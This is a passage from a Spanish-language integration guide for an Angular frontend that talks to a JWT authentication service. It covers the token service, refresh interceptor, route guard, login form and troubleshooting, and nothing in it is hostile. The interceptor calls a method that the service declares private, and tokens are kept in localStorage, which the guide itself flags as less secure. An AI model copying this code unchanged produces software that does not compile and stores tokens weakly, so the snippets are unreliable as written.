    return this.http.post<LoginResponse>(`${this.API_URL}/refresh`, {
      refreshToken
    }).pipe(
      tap(response => {
        this.saveTokens(response.accessToken, response.refreshToken);
      })
    );
  }

  /**
   * Logout (cierre de sesi√≥n)
   */
  logout(): Observable<void> {
    const refreshToken = this.getRefreshToken();
    
    return this.http.post<void>(`${this.API_URL}/logout`, {
      refreshToken
    }).pipe(
      tap(() => this.clearTokens())
    );
  }

  /**
   * Logout en todos los dispositivos
   */
  logoutAll(): Observable<void> {
    const refreshToken = this.getRefreshToken();
    
    return this.http.post<void>(`${this.API_URL}/logout-all`, {
      refreshToken
    }).pipe(
      tap(() => this.clearTokens())
    );
  }

  /**
   * Obtener perfil del usuario autenticado
   */
  getProfile(): Observable<UserResponse> {
    return this.http.get<UserResponse>(`${this.API_URL}/me`);
  }

  /**
   * Verificar si el usuario est√° autenticado
   */
  isAuthenticated(): boolean {
    const token = this.getAccessToken();
    return !!token && !this.isTokenExpired(token);
  }

  /**
   * Verificar si el token est√° expirado
   */
  private isTokenExpired(token: string): boolean {
    try {
      const payload = JSON.parse(atob(token.split('.')[1]));
      const expirationDate = new Date(payload.exp * 1000);
      return expirationDate < new Date();
    } catch {
      return true;
    }
  }

  /**
   * Guardar tokens en localStorage
   * ‚ö†Ô∏è Ver secci√≥n "Almacenamiento de Tokens" para alternativa m√°s segura
   */
  private saveTokens(accessToken: string, refreshToken: string): void {
    localStorage.setItem('accessToken', accessToken);
    localStorage.setItem('refreshToken', refreshToken);
  }

  /**
   * Obtener access token
   */
  getAccessToken(): string | null {
    return localStorage.getItem('accessToken');
  }

  /**
   * Obtener refresh token
   */
  private getRefreshToken(): string | null {
    return localStorage.getItem('refreshToken');
  }

  /**
   * Limpiar tokens
   */
  private clearTokens(): void {
    localStorage.removeItem('accessToken');
    localStorage.removeItem('refreshToken');
  }
}
```

---

### 2. HTTP Interceptor

```typescript
// auth.interceptor.ts
import { Injectable } from '@angular/core';
import {
  HttpRequest,
  HttpHandler,
  HttpEvent,
  HttpInterceptor,
  HttpErrorResponse
} from '@angular/common/http';
import { Observable, throwError, BehaviorSubject } from 'rxjs';
import { catchError, filter, take, switchMap } from 'rxjs/operators';
import { AuthService } from './auth.service';
import { Router } from '@angular/router';

@Injectable()
export class AuthInterceptor implements HttpInterceptor {
  private isRefreshing = false;
  private refreshTokenSubject: BehaviorSubject<any> = new BehaviorSubject<any>(null);

  constructor(
    private authService: AuthService,
    private router: Router
  ) {}

  intercept(request: HttpRequest<unknown>, next: HttpHandler): Observable<HttpEvent<unknown>> {
    // Agregar token a la petici√≥n si existe
    const token = this.authService.getAccessToken();
    
    if (token) {
      request = this.addToken(request, token);
    }

    return next.handle(request).pipe(
      catchError(error => {
        if (error instanceof HttpErrorResponse && error.status === 401) {
          return this.handle401Error(request, next);
        }
        return throwError(() => error);
      })
    );
  }

  private addToken(request: HttpRequest<any>, token: string): HttpRequest<any> {
    return request.clone({
      setHeaders: {
        Authorization: `Bearer ${token}`
      }
    });
  }

  private handle401Error(request: HttpRequest<any>, next: HttpHandler): Observable<HttpEvent<any>> {
    if (!this.isRefreshing) {
      this.isRefreshing = true;
      this.refreshTokenSubject.next(null);

      return this.authService.refresh().pipe(
        switchMap((response: any) => {
          this.isRefreshing = false;
          this.refreshTokenSubject.next(response.accessToken);
          return next.handle(this.addToken(request, response.accessToken));
        }),
        catchError((error) => {
          this.isRefreshing = false;
          this.authService.clearTokens();
          this.router.navigate(['/login']);
          return throwError(() => error);
        })
      );
    } else {
      return this.refreshTokenSubject.pipe(
        filter(token => token != null),
        take(1),
        switchMap(token => {
          return next.handle(this.addToken(request, token));
        })
      );
    }
  }
}
```

**Registro en app.module.ts:**
```typescript
import { HTTP_INTERCEPTORS } from '@angular/common/http';

@NgModule({
  providers: [
    {
      provide: HTTP_INTERCEPTORS,
      useClass: AuthInterceptor,
      multi: true
    }
  ]
})
export class AppModule { }
```

---

### 3. AuthGuard

```typescript
// auth.guard.ts
import { Injectable } from '@angular/core';
import { Router, CanActivate, ActivatedRouteSnapshot, RouterStateSnapshot } from '@angular/router';
import { AuthService } from './auth.service';

@Injectable({ providedIn: 'root' })
export class AuthGuard implements CanActivate {
  constructor(
    private authService: AuthService,
    private router: Router
  ) {}

  canActivate(route: ActivatedRouteSnapshot, state: RouterStateSnapshot): boolean {
    if (this.authService.isAuthenticated()) {
      return true;
    }

    // No autenticado, redirigir a login con URL de retorno
    this.router.navigate(['/login'], {
      queryParams: { returnUrl: state.url }
    });
    
    return false;
  }
}
```

**Uso en routing:**
```typescript
// app-routing.module.ts
const routes: Routes = [
  { path: 'login', component: LoginComponent },
  { 
    path: 'dashboard', 
    component: DashboardComponent,
    canActivate: [AuthGuard]  // ‚Üê Ruta protegida
  },
  { 
    path: 'profile', 
    component: ProfileComponent,
    canActivate: [AuthGuard]  // ‚Üê Ruta protegida
  }
];
```

---

### 4. Componente de Login

```typescript
// login.component.ts
import { Component } from '@angular/core';
import { FormBuilder, FormGroup, Validators } from '@angular/forms';
import { Router, ActivatedRoute } from '@angular/router';
import { AuthService } from '../auth.service';

@Component({
  selector: 'app-login',
  templateUrl: './login.component.html'
})
export class LoginComponent {
  loginForm: FormGroup;
  loading = false;
  error = '';
  returnUrl = '/dashboard';

  constructor(
    private fb: FormBuilder,
    private authService: AuthService,
    private router: Router,
    private route: ActivatedRoute
  ) {
    this.loginForm = this.fb.group({
      identifier: ['', Validators.required],
      password: ['', Validators.required]
    });

    // Obtener URL de retorno
    this.returnUrl = this.route.snapshot.queryParams['returnUrl'] || '/dashboard';
  }

  onSubmit(): void {
    if (this.loginForm.invalid) {
      return;
    }

    this.loading = true;
    this.error = '';

    const { identifier, password } = this.loginForm.value;

    this.authService.login(identifier, password).subscribe({
      next: () => {
        this.router.navigate([this.returnUrl]);
      },
      error: (error) => {
        this.loading = false;
        
        if (error.status === 401) {
          this.error = 'Usuario o contrase√±a incorrectos';
        } else if (error.status === 403) {
          this.error = error.error.message; // "Cuenta bloqueada..."
        } else if (error.status === 429) {
          this.error = 'Demasiados intentos. Intenta m√°s tarde.';
        } else {
          this.error = 'Error al iniciar sesi√≥n. Intenta nuevamente.';
        }
      }
    });
  }
}
```

```html
<!-- login.component.html -->
<div class="login-container">
  <h2>Iniciar Sesi√≥n</h2>
  
  <form [formGroup]="loginForm" (ngSubmit)="onSubmit()">
    <div class="form-group">
      <label for="identifier">Email o Usuario</label>
      <input 
        type="text" 
        id="identifier" 
        formControlName="identifier"
        placeholder="admin@test.com"
        [class.error]="loginForm.get('identifier')?.invalid && loginForm.get('identifier')?.touched"
      />
    </div>

    <div class="form-group">
      <label for="password">Contrase√±a</label>
      <input 
        type="password" 
        id="password" 
        formControlName="password"
        [class.error]="loginForm.get('password')?.invalid && loginForm.get('password')?.touched"
      />
    </div>

    <div *ngIf="error" class="error-message">
      {{ error }}
    </div>

    <button 
      type="submit" 
      [disabled]="loading || loginForm.invalid"
    >
      {{ loading ? 'Cargando...' : 'Iniciar Sesi√≥n' }}
    </button>
  </form>
</div>
```

---

## ü§ñ Generaci√≥n Autom√°tica de Cliente

Puedes generar autom√°ticamente un cliente Angular usando la especificaci√≥n OpenAPI:

### Usando ng-openapi-gen

```bash
# 1. Instalar generador
npm install -g ng-openapi-gen

# 2. Descargar especificaci√≥n
curl http://localhost:8080/v3/api-docs.yaml > api-spec.yaml

# 3. Generar c√≥digo
ng-openapi-gen --input api-spec.yaml --output src/app/api

# 4. Usar servicios generados
import { AuthService } from './api/services/auth.service';
```

**Ventajas:**
- ‚úÖ Tipos TypeScript autom√°ticos
- ‚úÖ Servicios completamente tipados
- ‚úÖ Modelos sincronizados con backend
- ‚úÖ Menos propenso a errores

---

## üîß Troubleshooting

### 1. Error de CORS

**S√≠ntoma:**
```
Access to XMLHttpRequest at 'http://localhost:8080/auth/login' 
from origin 'http://localhost:4200' has been blocked by CORS policy
```

**Soluci√≥n:**
```bash
# Verificar que tu origen est√© en CORS_ALLOWED_ORIGINS del backend
# Archivo .env:
CORS_ALLOWED_ORIGINS=http://localhost:4200,http://localhost:3000

# Reiniciar backend
docker-compose down
docker-compose up -d
```

---

### 2. Token Expirado Constantemente

**S√≠ntoma:**
- Token expira cada 15 minutos
- Usuario debe hacer login frecuentemente

**Soluci√≥n:**
- Implementar refresh autom√°tico (ver secci√≥n "HTTP Interceptor")
- El interceptor debe detectar error 401 y llamar a `/auth/refresh`

---

### 3. Error 429 (Too Many Requests)

**S√≠ntoma:**
```json
{
  "error": "Too Many Requests",
  "message": "Rate limit exceeded"
}
```

**Soluci√≥n:**
- Esperar 30 minutos
- O reiniciar contenedor Redis (borra l√≠mites):
```bash
docker-compose restart redis
```

---

### 4. Refresh Token Inv√°lido

**S√≠ntoma:**
```json
{
  "error": "Unauthorized",
  "message": "Invalid or expired refresh token"
}
```

**Causas:**
1. Token expir√≥ (7 d√≠as)
2. Token ya fue usado (rotaci√≥n)
3. Usuario hizo logout

**Soluci√≥n:**
- Redirigir a login
- Limpiar tokens de storage

---

### 5. Usuario Bloqueado

**S√≠ntoma:**
```json
{
  "status": 403,
  "message": "Account is locked due to multiple failed attempts"
}
```

**Soluci√≥n:**
- Esperar 30 minutos
- O resetear intentos en base de datos:
```sql
UPDATE users SET failed_attempts = 0 WHERE email = 'admin@test.com';
```

---

## üìû Soporte

Para preguntas o problemas:

1. **Documentaci√≥n Swagger**: http://localhost:8080/swagger-ui/index.html
2. **Health Check**: http://localhost:8080/actuator/health
3. **Repositorio Backend**: https://github.com/kevinbayter/wom-auth-service-api

---

## üìù Checklist de Integraci√≥n

Usa este checklist para verificar que tu frontend est√© correctamente integrado:

- [ ] Consumo exitoso de `/auth/login`
- [ ] Tokens guardados correctamente (preferiblemente en Cookies HttpOnly)
- [ ] Header `Authorization: Bearer <token>` en peticiones protegidas
- [ ] Interceptor HTTP implementado
- [ ] Refresh autom√°tico de tokens funcionando
- [ ] AuthGuard protegiendo rutas
- [ ] Manejo de errores 401, 403, 429
- [ ] Logout limpia tokens y redirige a login
- [ ] CORS configurado correctamente
- [ ] Perfil de usuario (`/auth/me`) se obtiene correctamente

---

<div align="center">

**Desarrollado con ‚ù§Ô∏è para WOM**

[üìö Swagger UI](http://localhost:8080/swagger-ui/index.html) ‚Ä¢ 
[üîç OpenAPI Spec](http://localhost:8080/v3/api-docs) ‚Ä¢ 
[‚ù§Ô∏è Health Check](http://localhost:8080/actuator/health)

</div>
